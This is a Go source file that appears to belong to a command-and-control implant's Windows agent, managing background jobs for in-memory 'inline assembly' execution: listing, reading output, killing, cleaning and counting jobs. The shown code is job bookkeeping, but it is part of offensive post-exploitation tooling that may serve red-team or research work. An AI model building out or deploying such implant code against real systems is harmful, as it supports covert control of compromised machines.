// server/docker/payloads/Windows/action_inline_assembly_async.go
//go:build windows
// +build windows

package main

import (
	"fmt"
	"os"
	"strings"
	"sync"
	"time"
)

// AssemblyJob represents an async assembly execution job
type AssemblyJob struct {
	ID              string
	CommandID       string
	CommandDBID     int
	AgentID         string
	Name            string
	Status          string // "running", "completed", "failed", "killed"
	StartTime       time.Time
	EndTime         *time.Time
	Output          strings.Builder
	Error           error
	CancelChan      chan bool
	OutputMutex     sync.Mutex
	Command         Command
	OutputTruncated bool
	TotalBytesSent  int
	Process         *os.Process
	TokenContext    *AssemblyTokenContext
}

// AssemblyJobManager manages async assembly jobs
type AssemblyJobManager struct {
	jobs map[string]*AssemblyJob
	mu   sync.RWMutex
}

var assemblyJobManager = &AssemblyJobManager{
	jobs: make(map[string]*AssemblyJob),
}

// InlineAssemblyJobsCommand lists running assembly jobs
type InlineAssemblyJobsCommand struct{}

func (c *InlineAssemblyJobsCommand) Name() string {
	return "inline-assembly-jobs"
}

func (c *InlineAssemblyJobsCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	return executeAssemblyJobsList()
}

// InlineAssemblyOutputCommand retrieves output from an assembly job
type InlineAssemblyOutputCommand struct{}

func (c *InlineAssemblyOutputCommand) Name() string {
	return "inline-assembly-output"
}

func (c *InlineAssemblyOutputCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) == 0 {
		return CommandResult{
			Output:      "Error: Job ID required\nUsage: inline-assembly-output <job_id>",
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	jobID := args[0]

	// Get the job
	job, exists := GetAssemblyJob(jobID)
	if !exists {
		// Try partial match
		jobs := assemblyJobManager.ListJobs()
		for _, j := range jobs {
			if strings.HasPrefix(j.ID, jobID) {
				job = j
				exists = true
				break
			}
		}

		if !exists {
			return CommandResult{
				Output:      fmt.Sprintf("Job %s not found", jobID),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}
	}

	// Lock and get output
	job.OutputMutex.Lock()
	output := job.Output.String()
	status := job.Status
	truncated := job.OutputTruncated
	bufferSize := job.Output.Len()
	job.OutputMutex.Unlock()

	// Build the response based on status
	var result strings.Builder

	// Add status header
	result.WriteString(fmt.Sprintf("[*] Job %s - Status: %s\n", job.ID, status))

	if truncated {
		result.WriteString("[!] Output truncated - exceeded 10MB limit\n")
	}

	if status == "running" {
		duration := time.Since(job.StartTime).Round(time.Second)
		result.WriteString(fmt.Sprintf("[*] Running for: %s\n", duration))
		result.WriteString(fmt.Sprintf("[*] Current buffer size: %d bytes\n", bufferSize))
	} else {
		if job.EndTime != nil {
			duration := job.EndTime.Sub(job.StartTime).Round(time.Second)
			result.WriteString(fmt.Sprintf("[*] Duration: %s\n", duration))
		}
	}

	result.WriteString("========================================\n")

	// Add the actual output
	if output == "" {
		result.WriteString("[*] No output captured yet\n")
	} else {
		result.WriteString(output)
	}

	return CommandResult{
		Output:      result.String(),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// InlineAssemblyKillCommand terminates an assembly job
type InlineAssemblyKillCommand struct{}

func (c *InlineAssemblyKillCommand) Name() string {
	return "inline-assembly-kill"
}

func (c *InlineAssemblyKillCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) < 1 {
		return CommandResult{
			Output:   "Usage: inline-assembly-kill <job_id>",
			ExitCode: 1,
		}
	}

	jobID := args[0]
	return executeAssemblyKillJob(jobID)
}

// executeAssemblyJobsList lists all assembly jobs
func executeAssemblyJobsList() CommandResult {
	jobs := assemblyJobManager.ListJobs()

	if len(jobs) == 0 {
		return CommandResult{
			Output:   "No active inline assembly jobs",
			ExitCode: 0,
		}
	}

	var output strings.Builder
	output.WriteString(fmt.Sprintf("Active Inline Assembly Jobs (%d):\n", len(jobs)))
	output.WriteString("================================================================================\n")
	output.WriteString("Job ID                   | Assembly Name       | Status      | Duration         \n")
	output.WriteString("--------------------------------------------------------------------------------\n")

	now := time.Now()
	for _, job := range jobs {
		job.OutputMutex.Lock()
		duration := now.Sub(job.StartTime)
		if job.EndTime != nil {
			duration = job.EndTime.Sub(job.StartTime)
		}

		durationStr := duration.Round(time.Second).String()

		// Truncate name if too long
		name := job.Name
		if len(name) > 19 {
			name = name[:16] + "..."
		}

		output.WriteString(fmt.Sprintf("%-24s | %-19s | %-11s | %-16s\n",
			job.ID[:min(24, len(job.ID))],
			name,
			job.Status,
			durationStr))
		job.OutputMutex.Unlock()
	}

	return CommandResult{
		Output:   output.String(),
		ExitCode: 0,
	}
}

// executeAssemblyGetOutput retrieves output from a job
func executeAssemblyGetOutput(jobID string) CommandResult {
	job := assemblyJobManager.GetJob(jobID)
	if job == nil {
		// Try partial match
		jobs := assemblyJobManager.ListJobs()
		for _, j := range jobs {
			if strings.HasPrefix(j.ID, jobID) {
				job = j
				break
			}
		}
	}

	if job == nil {
		return CommandResult{
			Output:   fmt.Sprintf("Job not found: %s", jobID),
			ExitCode: 1,
		}
	}

	job.OutputMutex.Lock()
	output := job.Output.String()
	status := job.Status
	truncated := job.OutputTruncated
	job.OutputMutex.Unlock()

	truncatedMsg := ""
	if truncated {
		truncatedMsg = " (OUTPUT TRUNCATED - exceeded 10MB limit)"
	}

	if output == "" {
		if status == "running" {
			output = fmt.Sprintf("Job %s is still running%s", job.ID, truncatedMsg)
		} else {
			output = fmt.Sprintf("Job %s (%s) has no buffered output%s", job.ID, status, truncatedMsg)
		}
	} else {
		output = fmt.Sprintf("Output for job %s%s:\n%s", job.ID, truncatedMsg, output)
	}

	return CommandResult{
		Output:   output,
		ExitCode: 0,
		JobID:    jobID,
	}
}

// executeAssemblyKillJob terminates a running job
func executeAssemblyKillJob(jobID string) CommandResult {
	job := assemblyJobManager.GetJob(jobID)
	if job == nil {
		// Try partial match
		jobs := assemblyJobManager.ListJobs()
		for _, j := range jobs {
			if strings.HasPrefix(j.ID, jobID) {
				job = j
				break
			}
		}
	}

	if job == nil {
		return CommandResult{
			Output:   fmt.Sprintf("Job not found: %s", jobID),
			ExitCode: 1,
		}
	}

	if job.Status != "running" {
		return CommandResult{
			Output:   fmt.Sprintf("Job %s is not running (status: %s)", job.ID, job.Status),
			ExitCode: 1,
		}
	}

	// Send cancel signal
	select {
	case job.CancelChan <- true:
		time.Sleep(100 * time.Millisecond)

		// Mark as killed
		assemblyJobManager.mu.Lock()
		job.Status = "killed"
		endTime := time.Now()
		job.EndTime = &endTime
		assemblyJobManager.mu.Unlock()

		return CommandResult{
			Output:   fmt.Sprintf("Job %s terminated", job.ID),
			ExitCode: 0,
			JobID:    jobID,
		}
	default:
		return CommandResult{
			Output:   "Failed to send kill signal to job",
			ExitCode: 1,
		}
	}
}

// Helper methods for AssemblyJobManager
func (ajm *AssemblyJobManager) AddJob(job *AssemblyJob) {
	ajm.mu.Lock()
	defer ajm.mu.Unlock()
	ajm.jobs[job.ID] = job
}

func (ajm *AssemblyJobManager) GetJob(jobID string) *AssemblyJob {
	ajm.mu.RLock()
	defer ajm.mu.RUnlock()
	return ajm.jobs[jobID]
}

func (ajm *AssemblyJobManager) ListJobs() []*AssemblyJob {
	ajm.mu.RLock()
	defer ajm.mu.RUnlock()

	jobs := make([]*AssemblyJob, 0, len(ajm.jobs))
	for _, job := range ajm.jobs {
		jobs = append(jobs, job)
	}
	return jobs
}

func (ajm *AssemblyJobManager) RemoveJob(jobID string) {
	ajm.mu.Lock()
	defer ajm.mu.Unlock()
	delete(ajm.jobs, jobID)
}

func (ajm *AssemblyJobManager) CleanupOldJobs(maxAge time.Duration) {
	ajm.mu.Lock()
	defer ajm.mu.Unlock()

	now := time.Now()
	for id, job := range ajm.jobs {
		if job.Status != "running" && job.EndTime != nil {
			if now.Sub(*job.EndTime) > maxAge {
				delete(ajm.jobs, id)
				fmt.Printf("[Assembly Jobs] Cleaned up old job: %s\n", id)
			}
		}
	}
}

// CleanupCompletedJobs removes all completed jobs and returns count
func (ajm *AssemblyJobManager) CleanupCompletedJobs() int {
	ajm.mu.Lock()
	defer ajm.mu.Unlock()

	cleaned := 0
	for id, job := range ajm.jobs {
		if job.Status != "running" {
			delete(ajm.jobs, id)
			cleaned++
			fmt.Printf("[Assembly Jobs] Cleaned job: %s (status: %s)\n", id, job.Status)
		}
	}

	return cleaned
}

// InlineAssemblyJobsCleanCommand cleans up completed/killed assembly jobs
type InlineAssemblyJobsCleanCommand struct{}

func (c *InlineAssemblyJobsCleanCommand) Name() string {
	return "inline-assembly-jobs-clean"
}

func (c *InlineAssemblyJobsCleanCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) == 0 {
		// Clean all non-running jobs
		return executeAssemblyJobsCleanAll()
	}
	// Clean specific job
	return executeAssemblyJobsCleanSpecific(args[0])
}

func executeAssemblyJobsCleanAll() CommandResult {
	cleaned := assemblyJobManager.CleanupCompletedJobs()

	if cleaned == 0 {
		return CommandResult{
			Output:   "No completed jobs to clean",
			ExitCode: 0,
		}
	}

	return CommandResult{
		Output:   fmt.Sprintf("Cleaned %d completed/killed job(s)", cleaned),
		ExitCode: 0,
	}
}

func executeAssemblyJobsCleanSpecific(jobID string) CommandResult {
	job := assemblyJobManager.GetJob(jobID)
	if job == nil {
		// Try partial match
		jobs := assemblyJobManager.ListJobs()
		for _, j := range jobs {
			if strings.HasPrefix(j.ID, jobID) {
				job = j
				break
			}
		}
	}

	if job == nil {
		return CommandResult{
			Output:   fmt.Sprintf("Job not found: %s", jobID),
			ExitCode: 1,
		}
	}

	if job.Status == "running" {
		return CommandResult{
			Output:   fmt.Sprintf("Cannot clean running job %s (use inline-assembly-kill first)", job.ID),
			ExitCode: 1,
		}
	}

	assemblyJobManager.RemoveJob(job.ID)

	return CommandResult{
		Output:   fmt.Sprintf("Cleaned job %s", job.ID),
		ExitCode: 0,
	}
}

// InlineAssemblyJobsStatsCommand shows job statistics
type InlineAssemblyJobsStatsCommand struct{}

func (c *InlineAssemblyJobsStatsCommand) Name() string {
	return "inline-assembly-jobs-stats"
}

func (c *InlineAssemblyJobsStatsCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	return executeAssemblyJobsStats()
}

func executeAssemblyJobsStats() CommandResult {
	jobs := assemblyJobManager.ListJobs()

	if len(jobs) == 0 {
		return CommandResult{
			Output:   "No assembly jobs in memory",
			ExitCode: 0,
		}
	}

	stats := struct {
		Total     int
		Running   int
		Completed int
		Failed    int
		Killed    int
		Timeout   int
	}{
		Total: len(jobs),
	}

	for _, job := range jobs {
		switch job.Status {
		case "running":
			stats.Running++
		case "completed":
			stats.Completed++
		case "failed":
			stats.Failed++
		case "killed":
			stats.Killed++
		case "timeout":
			stats.Timeout++
		}
	}

	var output strings.Builder
	output.WriteString("Assembly Job Statistics:\n")
	output.WriteString("========================\n")
	output.WriteString(fmt.Sprintf("Total Jobs:     %d\n", stats.Total))
	output.WriteString(fmt.Sprintf("Running:        %d\n", stats.Running))
	output.WriteString(fmt.Sprintf("Completed:      %d\n", stats.Completed))
	output.WriteString(fmt.Sprintf("Failed:         %d\n", stats.Failed))
	output.WriteString(fmt.Sprintf("Killed:         %d\n", stats.Killed))
	output.WriteString(fmt.Sprintf("Timeout:        %d\n", stats.Timeout))

	return CommandResult{
		Output:   output.String(),
		ExitCode: 0,
	}
}

// GetAssemblyJob is a helper function to get a job by ID
func GetAssemblyJob(jobID string) (*AssemblyJob, bool) {
	assemblyJobManager.mu.RLock()
	defer assemblyJobManager.mu.RUnlock()

	job, exists := assemblyJobManager.jobs[jobID]
	return job, exists
}

// Initialize cleanup routine for assembly jobs
func init() {
	go func() {
		ticker := time.NewTicker(1 * time.Hour)
		defer ticker.Stop()

		for range ticker.C {
			assemblyJobManager.CleanupOldJobs(24 * time.Hour)
		}
	}()
}
